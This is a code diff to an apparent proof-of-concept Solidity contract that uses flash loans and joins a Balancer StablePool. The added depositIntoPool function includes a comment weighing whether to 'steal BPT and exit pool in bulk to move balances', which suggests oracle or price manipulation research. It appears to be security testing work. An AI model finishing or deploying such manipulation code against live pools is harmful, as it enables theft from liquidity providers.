@@ -43,6 +43,13 @@ contract RateProofOfConcept is FlashLoanReceiverBase, IOracleRelay {
   //Balancer Vault
   IBalancerVault public immutable VAULT; // = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
+  // Legacy JoinKind - Applies to StablePool, MetaStablePool, StablePool V2
+  enum JoinKind {
+    INIT,
+    EXACT_TOKENS_IN_FOR_BPT_OUT,
+    TOKEN_IN_FOR_EXACT_BPT_OUT
+  }
+
   /**
    * @param pool_address - Balancer StablePool or MetaStablePool address
    */
@@ -141,6 +148,40 @@ contract RateProofOfConcept is FlashLoanReceiverBase, IOracleRelay {
 
   function depositIntoPool(address asset) internal {
     console.log("DEPOSIT INTO POOL");
+    (IERC20[] memory tokens, uint256[] memory balances /**uint256 lastChangeBlock */, ) = VAULT.getPoolTokens(_poolId);
+
+    IAsset[] memory assets = new IAsset[](2);
+    assets[0] = IAsset(address(tokens[0]));
+    assets[1] = IAsset(address(tokens[1]));
+
+    uint256[] memory maxAmountsIn = new uint256[](2);
+    maxAmountsIn[0] = tokens[0].balanceOf(address(this)); //should be 0
+    maxAmountsIn[1] = tokens[1].balanceOf(address(this));
+
+    bytes memory data = abi.encode(JoinKind.TOKEN_IN_FOR_EXACT_BPT_OUT);
+
+    console.log("Asset0: ", address(assets[0]));
+    console.log("Asset1: ", address(assets[1]));
+    console.log("Asset0 had   : ", tokens[0].balanceOf(address(this)));
+    console.log("Asset1 had   : ", tokens[1].balanceOf(address(this)));
+    console.log("Max amount in 0: ", maxAmountsIn[0]);
+    console.log("Max amount in 1: ", maxAmountsIn[1]);
+    console.log("JOININGqqqq");
+
+    /// NEXT another idea, steal BPT and exit pool in bulk to move balances?
+    VAULT.joinPool(
+      _poolId,
+      address(this),
+      address(this),
+      IBalancerVault.JoinPoolRequest({
+        assets: assets,
+        maxAmountsIn: maxAmountsIn,
+        userData: data,
+        fromInternalBalance: false
+      })
+    );
+
+    console.log("JOINED POOL");
   }
 
   /*******************************GET & CHECK NAIVE PRICE********************************/
